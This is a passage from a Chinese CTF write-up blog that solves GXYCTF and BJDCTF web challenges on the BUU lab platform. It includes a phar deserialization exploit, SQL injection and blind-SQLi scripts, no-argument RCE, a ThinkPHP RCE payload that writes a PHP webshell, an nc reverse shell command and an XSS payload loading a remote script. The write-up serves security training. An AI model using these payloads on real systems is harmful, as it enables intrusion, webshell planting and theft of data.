serialize($a);</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">"UserInfo"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">3</span>:<span class="string">"age"</span>;s:<span class="number">2</span>:<span class="string">"15"</span>;s:<span class="number">4</span>:<span class="string">"blog"</span>;s:<span class="number">29</span>:<span class="string">"file:///var/www/html/flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>然后传参：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">no=<span class="number">0</span><span class="comment">/**/</span><span class="class"><span class="keyword">union</span>/**/<span class="title">select</span></span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="symbol">'O</span>:<span class="number">8</span>:<span class="string">"UserInfo"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">3</span>:<span class="string">"age"</span>;s:<span class="number">2</span>:<span class="string">"15"</span>;s:<span class="number">4</span>:<span class="string">"blog"</span>;s:<span class="number">29</span>:<span class="string">"file:///var/www/html/flag.php"</span>;&#125;'%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>返回了flag.php的base64，解码后得到flag<br><img src="/2020/04/08/BUU-Web3/14.png" alt></p>
<h1 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h1><p>进去后是一个登陆框，先抓包准备sql注入，但是没找到注入点，测试存在admin用户，先爆破一下密码。这里在首页源码中有提示（u9db8 (鶸) ）居然代表弱口令<br>得到密码为password<br><img src="/2020/04/08/BUU-Web3/15.png" alt><br>登陆进去后是一个文件上传页面，观察页面应该存在文件包含。尝试使用伪协议读取源码</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">home.php?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=upload</span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Filename;</span><br><span class="line">	<span class="keyword">public</span> $cmd;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sandbox = getcwd().<span class="string">"/uploads/"</span>.md5($_SESSION[<span class="string">'user'</span>]).<span class="string">"/"</span>;</span><br><span class="line">		$ext = <span class="string">".txt"</span>;</span><br><span class="line">		@mkdir($sandbox, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> !preg_match(<span class="string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span>, $_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">'user'</span>].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">"echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';"</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">"[^a-z0-9]"</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('illegal filename!');"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>($file[<span class="string">'size'</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('you are too big (â²â½`ã)');"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">"move_uploaded_file('"</span>.$file[<span class="string">'tmp_name'</span>].<span class="string">"', '"</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">"');"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">'user'</span>])&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('check token falied!');"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">	$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[<span class="string">"file"</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;"</span>.$uploader.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>home.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;Home&lt;/title&gt;"</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'user'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">"/.?f.?l.?a.?g.?/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"hacker!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">"/home$/i"</span>, $_GET[<span class="string">'file'</span>]) <span class="keyword">or</span> preg_match(<span class="string">"/upload$/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">				$file = $_GET[<span class="string">'file'</span>].<span class="string">".php"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				$file = $_GET[<span class="string">'file'</span>].<span class="string">".fxxkyou!"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"å½åå¼ç¨çæ¯ "</span>.$file;</span><br><span class="line">			<span class="keyword">require</span> $file;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"no permission!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意到源码中有一些类和方法，但是并没有反序列化，而且也有上传页面，所以联想到昨天刚学的phar反向序列化,并且在name变量中没有过滤phar协议。在Uploader类中的__destruct()方法里面可以执行eval，我们可以想办法让其执行<code>highlight_file(&quot;/var/www/html/flag.php&quot;);</code><br>于是可以构造：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">        	<span class="keyword">public</span> $Filename;</span><br><span class="line">			<span class="keyword">public</span> $cmd;</span><br><span class="line">			<span class="keyword">public</span> $token;</span><br><span class="line">        &#125;</span><br><span class="line">    @unlink(<span class="string">"2.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"2.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">    </span><br><span class="line">	$o = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$o-&gt;cmd = <span class="string">'highlight_file("/var/www/html/flag.php");'</span>;</span><br><span class="line">	$o-&gt;Filename = <span class="string">'exp'</span>;</span><br><span class="line">	$o-&gt;token = <span class="string">'GXYcecefee78047cb6a61627ae1a9052ef4'</span>; <span class="comment">//$_SESSION['user']</span></span><br><span class="line">	</span><br><span class="line">    $phar-&gt;setMetadata($o);</span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后上传生成的phar文件<br><img src="/2020/04/08/BUU-Web3/16.png" alt><br>token我们可以根据其拼接规律获得，也就是.txt前面那一段</p>
<p>上传后访问：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/home.php?file=upload&amp;name=phar:<span class="comment">///var/www/html/uploads/c1304cfdb22d946dd2f0514495cf8529/GXYcecefee78047cb6a61627ae1a9052ef4.txt</span></span><br></pre></td></tr></table></figure>

<p>再上传任意文件便得到了flag.php的源码，但是BUU上面的环境flag.php中是一句话木马。。。<img src="/2020/04/08/BUU-Web3/17.png" alt><br>开始以为是自己读错了，后面使用菜刀连接后发现flag.php中果然是一句话木马<img src="/2020/04/08/BUU-Web3/18.png" alt></p>
<p>不知道是什么原因，重新开启环境后就得到了flag，灵异事件？<img src="/2020/04/08/BUU-Web3/19.png" alt></p>
<p>参考链接：<a href="https://www.print1.top/index.php/2020/03/08/gxyctf2019babysqliv3-0/" target="_blank" rel="noopener">https://www.print1.top/index.php/2020/03/08/gxyctf2019babysqliv3-0/</a></p>
<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>进入题目没有什么发现，直接扫目录<br><img src="/2020/04/08/BUU-Web3/20.png" alt><br>发现.git源码泄露和flag.php<br>使用GitHack将源码下载下来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里用到了<a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/#comment-15" target="_blank" rel="noopener">无参数rce</a>，<a href="https://xz.aliyun.com/t/6737" target="_blank" rel="noopener">正则解释</a></p>
<blockquote>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">preg_replace</span> 的意思是如果将我们输入的替换之后只剩‘;’就能通过。其主要功能就是限制我们传输进来的必须时纯小写字母的函数，而且不能携带参数，例如<span class="function"><span class="title">print_r</span>(<span class="string">"123"</span>);这种的，是不允许进行传入的。</span></span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">preg_match的主要功能就是过滤函数，把一些常用不带参数的函数关键部分都给过滤了，需要去构造别的方法去执行命令。</span><br></pre></td></tr></table></figure>
</blockquote>
<p>一些函数</p>
<blockquote>
<p>  localeconv() 函数返回一包含本地数字及货币格式信息的数组。</p>
<p>scandir() 列出 images 目录中的文件和目录。</p>
<p>readfile() 输出一个文件。</p>
<p>current() 返回数组中的当前单元, 默认取第一个值。</p>
<p>pos() current() 的别名。</p>
<p>next() 函数将内部指针指向数组中的下一个元素，并输出。</p>
<p>array_reverse()以相反的元素顺序返回数组。</p>
<p>highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。  </p>
</blockquote>
<p>测试后发现这个正则虽然不能能够匹配存在参数的函数，但是可以嵌套函数使用。<br>然后就可以尝试构造：</p>
<blockquote>
<p>print_r(scandir(pos(localeconv())));</p>
</blockquote>
<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组，结合pos()能得到.，也就是当前目录，然后再加上scandir就能获取当前目录的所有的文件<br><img src="/2020/04/08/BUU-Web3/21.png" alt>)之后我们利用array_reverse() 将数组内容反转一下，利用next()指向flag.php文件==&gt;highlight_file()高亮输出。</p>
<p>payload:</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">?exp=highlight<span class="constructor">_file(<span class="params">next</span>(<span class="params">array_reverse</span>(<span class="params">scandir</span>(<span class="params">pos</span>(<span class="params">localeconv</span>()</span>)))));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/08/BUU-Web3/22.png" alt></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF-2nd-web复现</title>
    <url>/2020/03/24/BJDCTF-2nd-web/</url>
    <content><![CDATA[<p>[BJDCTF 2nd]fake google<br>知识点：SSTI模板注入</p>
<p>[BJDCTF 2nd]duangShell<br>知识点：PHP代码审计</p>
<p>[BJDCTF 2nd]简单注入<br>知识点：SQL盲注</p>
<p>[BJDCTF 2nd]old-hack<br>知识点：Thinkphp-rce</p>
<p>[BJDCTF ]假猪套天下第一<br>知识点：修改http头</p>
<p>[BJDCTF 2nd]Schrödinger<br>知识点：修改cookie</p>
<p>[BJDCTF 2nd]xss之光<br>知识点：git源码泄露 、PHP原生类反序列化</p>
<p>[BJDCTF ]elementmaster<br>知识点：python脚本</p>
<a id="more"></a>

<h1 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h1><p>这个题在学习flask之ssti注入的时候已经复现过了，在最后面<br>链接：<a href="http://cyzcc.vip/2020/03/22/flask-ssti/">http://cyzcc.vip/2020/03/22/flask-ssti/</a></p>
<h1 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h1><p>做这个题的时候第一感觉就是反弹shell。题目提示有源码泄露<br><img src="/2020/03/24/BJDCTF-2nd-web/5.png" alt><br>在kali里面<code>wget http://xxxxx/.index.php.swp</code>将源码下载，然后使用<code>vi -r .index.php.swp</code>恢复一下<br><img src="/2020/03/24/BJDCTF-2nd-web/6.png" alt><br>过滤了很多，我也尝试了很多方法反弹shell，均失败，后面发现别人是用nc反弹（我当时才想到靶机上安装了nc）但是也失败了。犯了两个致命的错误<br>1.没有仔细读题，靶机无法访问外网，我当时傻乎乎的还在往云服务器上面弹…..<br>2.当我拿到buu内网靶机的时候，使用Nikto查看了靶机真实ip，然后便用靶机真实ip去弹…..（没有使用<code>ip a</code>查看本地ip）。<br>当我醒悟过来时已经在崩溃的边缘了。。<br>使用<code>ip a</code>查看内网靶机本地ip后，</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">内网靶机监听</span><br><span class="line">nc -lvvp <span class="number">7777</span></span><br><span class="line">题目机器post发送</span><br><span class="line">girl_friend=nc <span class="number">174.1</span><span class="number">.92</span><span class="number">.63</span> <span class="number">7777</span> -e sh</span><br></pre></td></tr></table></figure>

<p>然后使用<code>find / -name flag</code>查找flag文件<br><img src="/2020/03/24/BJDCTF-2nd-web/7.png" alt></p>
<h1 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h1><p>记得当时点开就fuzz了一下，然后就懵逼了。后来看提示说有robots.txt,里面还有个hint.txt，进去看后发现了sql语句。<img src="/2020/03/24/BJDCTF-2nd-web/1.png" alt><br>fuzz后发现过滤了很多，select，like，=，’’等<br><img src="/2020/03/24/BJDCTF-2nd-web/2.png" alt><br>其实还是不知道该怎么办，看了wp后发现可以在第一处用<code>\</code>把引号打掉，第二处直接布尔盲注，1返回<code>BJD needs to be stronger</code>，0返回<code>You konw ,P3rh4ps needs a girl friend</code><br><img src="/2020/03/24/BJDCTF-2nd-web/3.png" alt><br>然后直接布尔盲注：<code>payload:or ascii(substr(password,8,1))&gt;116#     or ascii(substr(admin,8,1))&gt;116#</code><br>然后写脚本，但是由于太菜，过滤了=只能用&gt;来盲注，小弟现在还写不出来，于是只有用burp一个一个爆破<br>结果：username：admin<br>password：OhyOuFOuNdit<br>然后登录便得到flag</p>
<p><img src="/2020/03/24/BJDCTF-2nd-web/4.png" alt><br>附上大佬脚本，后面再将自己的脚本补上</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://71da6f65-d72b-44e1-9478-9930d6ed285d.node3.buuoj.cn/index.php'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inj</span><span class="params">(payload)</span>:</span></span><br><span class="line">    req=requests.post(url,data=&#123;<span class="string">'password'</span>:payload, <span class="string">'username'</span>:<span class="string">'s\\'</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'BJD needs to be stronger'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">result=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">" or ascii(substr(password, %d,1))&gt;%d #"</span> % (x, mid)</span><br><span class="line">        <span class="comment">#payload = " or ascii(substr(username, %d,1))&gt;%d #" % (x, mid)</span></span><br><span class="line">        res = inj(payload)</span><br><span class="line">        <span class="keyword">if</span> res:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<h1 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h1><p>这个题目进去后发现是thinkphp框架，想到可能有rce。于是直接找payload</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">server</span>[<span class="title">REQUEST_METHOD</span>]=<span class="title">echo</span> -<span class="title">n</span> <span class="title">YWE8P3BocCBAZXZhbCgkX1BPU1RbMTIzXSk7Pz5i</span> | <span class="title">base64</span> -<span class="title">d</span> &gt; <span class="title">shell3</span>.<span class="title">php</span></span></span><br></pre></td></tr></table></figure>

<p>使用base64加密向shell3.php中写入一句话木马，应为过滤了&amp;和一些其他符号，所以反弹shell行不通<br>以前有过这个漏洞的笔记：<a href="http://cyzcc.vip/2020/02/15/thinkphp5.0.23/">http://cyzcc.vip/2020/02/15/thinkphp5.0.23/</a><br>这是我唯一解出来的一道题，可能是最简单的一道。后面看见大佬们的wp发现可以直接<code>cat /flag</code>….我。。。这样显得我好蠢<br><img src="/2020/03/24/BJDCTF-2nd-web/1.jpg" alt="img"></p>
<h1 id="BJDCTF-假猪套天下第一"><a href="#BJDCTF-假猪套天下第一" class="headerlink" title="[BJDCTF ]假猪套天下第一"></a>[BJDCTF ]假猪套天下第一</h1><p>进去之后是一个登陆框，先抓包，发现提示 L0g1n.php，访问一下，发现现实要99年后才能访问<img src="/2020/03/24/BJDCTF-2nd-web/8.png" alt><br>然后又在cookoe里面发现了time参数，我们修改一下，将其改得特别大，又提示要在本地访问，这很可能要修改xxf头，但是行不通</p>
<p>官方提示<br>本地访问需要用 Client-IP(或者 X-Real-IP)这个 header，XFF 不行</p>
<p>告知用 Commodo 64 访问，但是 UA 改成 Commodo 64 后被告诉这不是真的 commodo64，随便查一下就能发现有一种系统叫 Commodore，所以要改成 Commodore 64<br><img src="/2020/03/24/BJDCTF-2nd-web/9.png" alt><br><img src="/2020/03/24/BJDCTF-2nd-web/10.png" alt><br>然后又提示要来自gem-love.com，所以要修改referer<br>跟着提示一步一步修改<br>最后得到base64，解码后便是flag<br><img src="/2020/03/24/BJDCTF-2nd-web/11.png" alt></p>
<h1 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h1><p>进去发现一个输入框，随便输入一个url，发现好像开始爆破了，但是很慢。查看 cookie 发现有个 <code>base64</code> 的 cookie 很可疑，decode 一下发现是提交时的时间戳。将该 cookie 里面的时间戳直接置空，刷新页面就发现成功率接近百分之百，但是没有发现什么因为并不知道url该怎么填</p>
<p>然后抓包，发现了test.php，但是说的要将test.php删除，于是将这个url去爆破一下<br><img src="/2020/03/24/BJDCTF-2nd-web/12.png" alt><br>访问后是一个登陆框<br>删除时间戳后点击check之后就发现了一个av号<br><img src="/2020/03/24/BJDCTF-2nd-web/13.png" alt><br>然后去b站就可以找到flag了</p>
<h1 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h1><p>进入题目后，没有什么发现，于是扫描 下目录，发现git源码泄露<br><img src="/2020/03/24/BJDCTF-2nd-web/14.png" alt><br>将.git/index下载下来</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">./GitHack.py http://<span class="number">067916</span>ae<span class="number">-1890</span><span class="number">-4</span><span class="keyword">c</span><span class="number">1</span><span class="keyword">c</span>-a<span class="number">5</span>ea<span class="number">-0</span>a<span class="number">90</span>da<span class="number">98</span>ff<span class="number">4</span><span class="keyword">c</span>.node<span class="number">3</span>.buuoj.cn/.git/</span><br></pre></td></tr></table></figure>

<p>这里又一次打击了我的智商，由于以前没用过这个工具，一直在git后面加了个/index,所以一直显示<code>error: Not a Git index file</code><img src="/2020/03/24/BJDCTF-2nd-web/15.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'yds_is_so_beautiful'</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure>

<p>这里没有类，所以只能对原生类进行反序列化<br><a href="http://blog.ydspoplar.top/2020/03/17/php%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB/" target="_blank" rel="noopener">参考文章</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script src=http://cyzcc.vip&gt;&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>运行该php，将输出的内容通过yds_is_so_beautiful传参，然后再请求头里面就返回了flag</p>
<p><img src="/2020/03/24/BJDCTF-2nd-web/16.png" alt></p>
<h1 id="BJDCTF-elementmaster"><a href="#BJDCTF-elementmaster" class="headerlink" title="[BJDCTF ]elementmaster"></a>[BJDCTF ]elementmaster</h1><p>提示<br>1.不需要扫描器，扫也扫不出来东西<br>2.mendeleev=门捷列夫<br>3.use some of your out of the box thinking<br>4.from requests import *<br>5.<a href="https://translate.google.com/" target="_blank" rel="noopener">https://translate.google.com/</a><br>6.用上 hint2 和 hint4<br>最后一小时给的 hint：<br>元素周期表字典+hex2string<br>查看源代码，发现id里面有一串Hex编码，Hex 转 String 得到 Po.php，访问得到一个字符<br>意思是让我们写脚本将所有元素.php里面的字符全都平凑起来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line">elements = (<span class="string">'H'</span>, <span class="string">'He'</span>, <span class="string">'Li'</span>, <span class="string">'Be'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'F'</span>, <span class="string">'Ne'</span>, <span class="string">'Na'</span>, <span class="string">'Mg'</span>, <span class="string">'Al'</span>, <span class="string">'Si'</span>, <span class="string">'P'</span>, <span class="string">'S'</span>, <span class="string">'Cl'</span>, <span class="string">'Ar'</span>,</span><br><span class="line">                  <span class="string">'K'</span>, <span class="string">'Ca'</span>, <span class="string">'Sc'</span>, <span class="string">'Ti'</span>, <span class="string">'V'</span>, <span class="string">'Cr'</span>, <span class="string">'Mn'</span>, <span class="string">'Fe'</span>, <span class="string">'Co'</span>, <span class="string">'Ni'</span>, <span class="string">'Cu'</span>, <span class="string">'Zn'</span>, <span class="string">'Ga'</span>, <span class="string">'Ge'</span>, <span class="string">'As'</span>, <span class="string">'Se'</span>, <span class="string">'Br'</span>, </span><br><span class="line">                  <span class="string">'Kr'</span>, <span class="string">'Rb'</span>, <span class="string">'Sr'</span>, <span class="string">'Y'</span>, <span class="string">'Zr'</span>, <span class="string">'Nb'</span>, <span class="string">'Mo'</span>, <span class="string">'Te'</span>, <span class="string">'Ru'</span>, <span class="string">'Rh'</span>, <span class="string">'Pd'</span>, <span class="string">'Ag'</span>, <span class="string">'Cd'</span>, <span class="string">'In'</span>, <span class="string">'Sn'</span>, <span class="string">'Sb'</span>, <span class="string">'Te'</span>, </span><br><span class="line">                  <span class="string">'I'</span>, <span class="string">'Xe'</span>, <span class="string">'Cs'</span>, <span class="string">'Ba'</span>, <span class="string">'La'</span>, <span class="string">'Ce'</span>, <span class="string">'Pr'</span>, <span class="string">'Nd'</span>, <span class="string">'Pm'</span>, <span 